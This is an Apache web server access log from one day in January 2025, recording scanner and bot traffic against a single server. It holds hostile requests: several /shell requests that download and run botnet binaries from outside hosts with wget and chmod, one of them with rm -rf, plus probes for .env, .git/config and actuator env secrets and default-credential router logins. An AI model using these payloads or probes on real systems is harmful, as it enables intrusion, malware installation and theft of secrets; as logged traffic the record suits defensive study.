104.236.3.45 - - [15/Jan/2025:00:28:18 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws" 400 524 "-" "-"
123.108.152.241 - - [15/Jan/2025:00:32:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
49.0.65.53 - - [15/Jan/2025:00:54:42 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.147 - - [15/Jan/2025:00:56:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [15/Jan/2025:00:56:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [15/Jan/2025:01:39:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
170.64.159.7 - - [15/Jan/2025:01:49:21 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:02:00:12 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
46.19.138.234 - - [15/Jan/2025:02:06:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
164.52.24.188 - - [15/Jan/2025:02:07:07 +0000] "\x16\x03\x01\x02" 400 524 "-" "-"
164.52.24.188 - - [15/Jan/2025:02:07:28 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.188 - - [15/Jan/2025:02:07:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
164.52.24.188 - - [15/Jan/2025:02:07:35 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.188 - - [15/Jan/2025:02:07:40 +0000] "GET / HTTP/1.1" 200 1684 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
87.120.120.18 - - [15/Jan/2025:02:22:09 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 635) like Gecko"
78.153.140.149 - - [15/Jan/2025:02:31:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:02:31:11 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:02:37:50 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:02:37:51 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:25 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080718 Ubuntu/8.04 (hardy) Firefox/2.0.0.16"
78.153.140.151 - - [15/Jan/2025:03:10:25 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.151 - - [15/Jan/2025:03:10:25 +0000] "GET /whturk/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.10) Gecko/20100914 SUSE/3.6.10-0.3.1 Firefox/3.6.10"
78.153.140.151 - - [15/Jan/2025:03:10:25 +0000] "GET /staging.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0"
78.153.140.151 - - [15/Jan/2025:03:10:25 +0000] "GET /ubuntu/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; 360SE)"
78.153.140.151 - - [15/Jan/2025:03:10:25 +0000] "GET /prisma/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64); zh-TW; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6"
78.153.140.151 - - [15/Jan/2025:03:10:26 +0000] "GET /travis/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
78.153.140.151 - - [15/Jan/2025:03:10:26 +0000] "GET /secret/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.25 (KHTML, like Gecko) Version/11.0 Mobile/15A5304j Safari/604.1"
78.153.140.151 - - [15/Jan/2025:03:10:26 +0000] "GET /parity/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 7.0; LGMS550 Build/NRD90U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:26 +0000] "GET /addons/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/63.0.3239.73 Mobile/13G36 Safari/601.1.46"
78.153.140.151 - - [15/Jan/2025:03:10:27 +0000] "GET /secure/.env HTTP/1.1" 302 331 "-" "Mozilla/6.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:2.0.0.0) Gecko/20061028 Firefox/3.0"
78.153.140.151 - - [15/Jan/2025:03:10:27 +0000] "GET /module/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; %lang2%) adbeat.com/policy AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B360 Safari/531.21.10"
78.153.140.151 - - [15/Jan/2025:03:10:27 +0000] "GET /widget/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2"
78.153.140.151 - - [15/Jan/2025:03:10:27 +0000] "GET /drupal/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SGH-T999N Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /kibana/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G955F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /jsrelay/.env HTTP/1.1" 302 331 "-" "Opera/9.64 (Windows NT 6.0; U; pl) Presto/2.1.1"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /layouts/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /website/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en_CA) AppleWebKit/125.4 (KHTML, like Gecko) Safari/125.9"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /plugins/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)"
78.153.140.151 - - [15/Jan/2025:03:10:29 +0000] "GET /profile/.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Android 2.2.1; Linux; Opera Mobi/ADR-1301071820) Presto/2.11.355 Version/12.10"
78.153.140.151 - - [15/Jan/2025:03:10:29 +0000] "GET /oldsite/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; CrOS x86_64 8172.56.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:30 +0000] "GET /webroot/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:31 +0000] "GET /sistema/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.3705)"
78.153.140.151 - - [15/Jan/2025:03:10:31 +0000] "GET /ikiwiki/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 5.1.1; 5054N Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:31 +0000] "GET /twitter/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.1.1 (KHTML, like Gecko) Safari/312"
78.153.140.151 - - [15/Jan/2025:03:10:32 +0000] "GET /widgets/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux Gentoo i686; pl; rv:1.8.0.8) Gecko/20061219 Firefox/1.5.0.8"
78.153.140.151 - - [15/Jan/2025:03:10:32 +0000] "GET /monerod/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 5.1; Z820 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:32 +0000] "GET /outputs/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.50 Safari/525.19"
78.153.140.151 - - [15/Jan/2025:03:10:33 +0000] "GET /classes/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) WebClip/9537.85.15.2 Safari/9537.85.15.3"
78.153.140.151 - - [15/Jan/2025:03:10:33 +0000] "GET /fileweb/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.11 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.11"
78.153.140.151 - - [15/Jan/2025:03:10:33 +0000] "GET /Backend/.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Windows NT 6.1; WOW64; U; en) Presto/2.10.289 Version/12.02"
78.153.140.151 - - [15/Jan/2025:03:10:33 +0000] "GET /sendgrid/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:34 +0000] "GET /dotfiles/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36 OPR/37.0.2178.32"
78.153.140.151 - - [15/Jan/2025:03:10:34 +0000] "GET /profiles/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.812.0 Safari/535.1"
78.153.140.151 - - [15/Jan/2025:03:10:34 +0000] "GET /examples/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008092809 Gentoo Firefox/3.0.2"
78.153.140.151 - - [15/Jan/2025:03:10:34 +0000] "GET /var/backup/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MDDC; BRI/1; .NET4.0C; BRI/2; AskTbX-SD/5.14.1.20007; .NET4.0E)"
78.153.140.151 - - [15/Jan/2025:03:10:35 +0000] "GET /lib64/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-be; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13"
78.153.140.151 - - [15/Jan/2025:03:10:35 +0000] "GET /2024/.env HTTP/1.1" 302 331 "-" "Safari/537.36 (Windows NT 6.2; WOW64) AppleWebKit/537.36"
92.255.57.58 - - [15/Jan/2025:03:16:01 +0000] "\x16\x03\x01\x05\xa8\x01" 400 524 "-" "-"
66.175.213.4 - - [15/Jan/2025:03:45:35 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.149 - - [15/Jan/2025:03:56:15 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:03:56:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
64.62.197.236 - - [15/Jan/2025:04:10:34 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
64.62.197.229 - - [15/Jan/2025:04:12:29 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
64.62.197.236 - - [15/Jan/2025:04:13:01 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
31.220.1.144 - - [15/Jan/2025:04:33:47 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
141.98.11.119 - - [15/Jan/2025:04:37:33 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
78.153.140.149 - - [15/Jan/2025:04:52:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:04:52:37 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.214.55.226 - - [15/Jan/2025:05:01:01 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
83.222.191.146 - - [15/Jan/2025:05:05:13 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.180.140.101 - - [15/Jan/2025:05:09:19 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
76.244.18.43 - - [15/Jan/2025:05:39:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
117.231.142.178 - - [15/Jan/2025:05:41:19 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 302 350 "-" "-"
172.104.11.46 - - [15/Jan/2025:05:46:05 +0000] "\x16\x03\x01" 400 524 "-" "-"
141.98.11.119 - - [15/Jan/2025:05:48:11 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
5.181.190.248 - - [15/Jan/2025:06:05:35 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:06:05:35 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
35.240.127.158 - - [15/Jan/2025:06:06:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
178.215.236.132 - - [15/Jan/2025:06:07:43 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:24.0) Gecko/20100101 Firefox/24.0"
147.185.132.15 - - [15/Jan/2025:06:12:04 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
172.169.6.20 - - [15/Jan/2025:06:32:39 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
31.13.224.222 - - [15/Jan/2025:06:33:01 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1"
31.13.224.36 - - [15/Jan/2025:06:38:59 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.93.221.56 - - [15/Jan/2025:06:39:14 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.2.1) Gecko/20100101 Firefox/52.2.1"
78.153.140.149 - - [15/Jan/2025:06:40:33 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:06:40:33 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
141.98.11.119 - - [15/Jan/2025:06:47:33 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
78.153.140.149 - - [15/Jan/2025:07:41:25 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:07:41:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
36.39.153.244 - - [15/Jan/2025:08:00:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.19.138.234 - - [15/Jan/2025:08:08:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.224 - - [15/Jan/2025:08:35:55 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Windows NT 6.1) Presto/2.12.388 Version/12.16"
78.153.140.224 - - [15/Jan/2025:08:35:55 +0000] "\x16\x03\x01" 400 524 "-" "-"
91.188.223.159 - - [15/Jan/2025:08:38:46 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
179.43.191.146 - - [15/Jan/2025:08:45:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
62.84.100.218 - - [15/Jan/2025:09:14:54 +0000] "GET /env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:09:14:56 +0000] "GET /actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:09:14:56 +0000] "GET /admin/actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.2.20"
62.84.100.218 - - [15/Jan/2025:09:14:58 +0000] "GET /api/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.0) AppleWebKit/617.28 (KHTML, like Gecko) Version/17.0 Safari/617.28"
62.84.100.218 - - [15/Jan/2025:09:15:00 +0000] "GET /admin/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:09:15:00 +0000] "GET /api/actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.7.24"
78.153.140.149 - - [15/Jan/2025:09:30:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:09:30:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
165.154.118.215 - - [15/Jan/2025:09:34:58 +0000] "\x16\x03\x01\x01\x17\x01" 400 524 "-" "-"
165.154.118.215 - - [15/Jan/2025:09:35:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
165.154.118.215 - - [15/Jan/2025:09:35:14 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:15 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:15 +0000] "GET /robots.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:15 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/robots.txt" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:16 +0000] "GET /sitemap.xml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:16 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/sitemap.xml" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:16 +0000] "GET /js/brand.js HTTP/1.1" 200 514 "-" "Go-http-client/1.1"
165.154.118.215 - - [15/Jan/2025:09:35:16 +0000] "GET /js/login.js HTTP/1.1" 200 866 "-" "Go-http-client/1.1"
165.154.118.215 - - [15/Jan/2025:09:35:17 +0000] "GET /config.json HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
::1 - - [15/Jan/2025:09:35:22 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
87.120.115.119 - - [15/Jan/2025:09:37:54 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0"
24.153.152.246 - - [15/Jan/2025:09:57:57 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
80.82.77.202 - - [15/Jan/2025:10:26:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11"
80.82.77.202 - - [15/Jan/2025:10:36:05 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
13.87.132.36 - - [15/Jan/2025:11:33:05 +0000] "GET /actuator/health HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
5.181.190.248 - - [15/Jan/2025:11:46:05 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:11:46:05 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
78.153.140.149 - - [15/Jan/2025:11:52:50 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:11:52:50 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
